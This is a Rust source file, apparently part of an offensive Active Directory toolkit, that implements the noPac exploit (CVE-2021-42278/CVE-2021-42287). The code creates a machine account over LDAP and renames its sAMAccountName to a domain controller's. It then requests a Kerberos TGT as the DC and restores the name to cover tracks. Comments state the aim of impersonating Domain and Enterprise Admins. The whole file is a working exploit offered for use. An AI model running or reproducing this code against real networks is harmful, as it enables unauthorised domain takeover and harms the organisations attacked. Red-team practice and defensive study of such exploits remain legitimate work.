//! noPac attack (CVE-2021-42278 / CVE-2021-42287) — SAMAccountName spoofing
//! combined with Kerberos SID history abuse.
//!
//! Attack flow:
//! 1. Create a machine account with a known password
//! 2. Modify its sAMAccountName to match a Domain Controller (e.g. "DC01$")
//! 3. Request a TGT for the DC-named account
//! 4. The KDC issues a ticket that can be used with SID history injection
//!    to impersonate Domain / Enterprise Admins
//!
//! Reference:
//! - <https://exploit.ph/cve-2021-42287-cve-2021-42278-and-you.html>

use crate::runner::ForgeConfig;
use colored::Colorize;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{TicketGrantingData, request_tgt};
use overthrone_core::proto::ldap::LdapSession;
use rand::RngExt;
use std::time::{SystemTime, UNIX_EPOCH};
use tracing::{debug, info, warn};

/// noPac attack result
pub struct NoPacResult {
    /// Domain controller targeted
    pub target_dc: String,
    /// Computer account created
    pub computer_name: String,
    /// Computer account DN
    pub computer_dn: String,
    /// Password used for the computer account
    pub computer_password: String,
    /// Domain SID
    pub domain_sid: String,
    /// Obtained TGT (if requested)
    pub tgt: Option<TicketGrantingData>,
    /// Whether the attack completed all phases
    pub completed: bool,
    /// Error message if any phase failed
    pub error: Option<String>,
}

/// Generate a random machine account password
fn generate_machine_password() -> String {
    let charset: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rand::rng();
    (0..32)
        .map(|_| {
            let idx = (rng.random::<u32>() as usize) % charset.len();
            charset[idx] as char
        })
        .collect()
}

/// Extract domain SID from LDAP session by reading the domain object
async fn get_domain_sid(ldap: &mut LdapSession) -> Result<String> {
    let entries = ldap
        .custom_search("(objectClass=domain)", &["objectSid"])
        .await?;

    if let Some(entry) = entries.first()
        && let Some(sids) = entry.attrs.get("objectSid")
        && let Some(sid_str) = sids.first()
    {
        // SID is already in string format (S-1-5-21-...) from LDAP
        return Ok(sid_str.clone());
    }
    Err(OverthroneError::custom("Could not retrieve domain SID"))
}

/// Convert raw SID bytes to S-string format (S-1-5-21-...)
#[allow(dead_code)]
fn format_sid_from_bytes(sid_bytes: &[u8]) -> String {
    if sid_bytes.len() < 8 {
        return "S-0-0".to_string();
    }
    let revision = sid_bytes[0];
    let sub_authority_count = sid_bytes[1] as usize;
    let mut id_auth: u64 = 0;
    for i in 0..6 {
        id_auth = (id_auth << 8) | sid_bytes[2 + i] as u64;
    }
    let mut parts = vec![format!("S-{}-{}", revision, id_auth)];
    for i in 0..sub_authority_count {
        let offset = 8 + i * 4;
        if offset + 4 <= sid_bytes.len() {
            let val = u32::from_le_bytes([
                sid_bytes[offset],
                sid_bytes[offset + 1],
                sid_bytes[offset + 2],
                sid_bytes[offset + 3],
            ]);
            parts.push(val.to_string());
        }
    }
    parts.join("-")
}

/// Execute the noPac attack:
/// 1. Create a machine account
/// 2. Set its sAMAccountName to match the target DC
/// 3. Request TGT for the DC-named machine
pub async fn run_nopac(config: &ForgeConfig, target_dc: &str) -> Result<NoPacResult> {
    info!(
        "{}",
        "═══ noPac Attack (CVE-2021-42278/CVE-2021-42287) ═══"
            .bold()
            .red()
    );
    info!("  Target DC: {}", target_dc.bold());

    let password = generate_machine_password();
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let computer_name = format!("NOPAC{ts:x}");

    // Step 1: Connect via LDAP and create machine account
    info!(
        "  {} Creating computer account: {computer_name}$ ...",
        "→".cyan()
    );
    let password_ref = config.password.as_deref().ok_or_else(|| {
        OverthroneError::TicketForge("Password is required for noPac LDAP operations".into())
    })?;
    let mut ldap = LdapSession::connect(
        &config.dc_ip,
        &config.domain,
        &config.username,
        password_ref,
        false,
    )
    .await?;

    let container = format!("CN=Computers,{}", ldap.base_dn);
    let computer_dn = ldap
        .add_computer(&format!("{computer_name}$"), &password, Some(&container))
        .await?;
    info!("  {} Computer created: {computer_dn}", "✓".green());

    // Step 2: Get domain SID
    let domain_sid = get_domain_sid(&mut ldap).await?;
    info!("  {} Domain SID: {domain_sid}", "→".cyan());

    // Step 3: Modify sAMAccountName to match target DC
    let dc_sam = if target_dc.ends_with('$') {
        target_dc.to_string()
    } else {
        format!("{target_dc}$")
    };
    info!("  {} Setting sAMAccountName to: {dc_sam} ...", "→".cyan());
    ldap.modify_replace(&computer_dn, "sAMAccountName", dc_sam.as_bytes())
        .await?;
    info!("  {} sAMAccountName modified successfully", "✓".green());

    // Step 4: Request TGT as the DC-named machine
    info!("  {} Requesting TGT as {dc_sam} ...", "→".cyan());
    let tgt = request_tgt(&config.dc_ip, &config.domain, &dc_sam, &password, false).await?;
    info!("  {} TGT obtained for {dc_sam}", "✓".green());

    // Step 5: Cleanup — restore the sAMAccountName to avoid leaving a
    // conflicting name on the domain
    info!("  {} Restoring sAMAccountName ...", "→".cyan());
    let restore_name = format!("{computer_name}$");
    if let Err(e) = ldap
        .modify_replace(&computer_dn, "sAMAccountName", restore_name.as_bytes())
        .await
    {
        warn!("  Could not restore sAMAccountName: {e}");
    } else {
        info!("  {} sAMAccountName restored", "✓".green());
    }

    info!("{}", "═══ noPac Attack Complete ═══".bold().green());
    info!("  Computer:   {computer_name}$");
    debug!("  Password:   {password}");
    info!("  Domain SID: {domain_sid}");
    info!("  TGT:        obtained for {dc_sam}");

    Ok(NoPacResult {
        target_dc: target_dc.to_string(),
        computer_name: format!("{computer_name}$"),
        computer_dn,
        computer_password: password,
        domain_sid,
        tgt: Some(tgt),
        completed: true,
        error: None,
    })
}
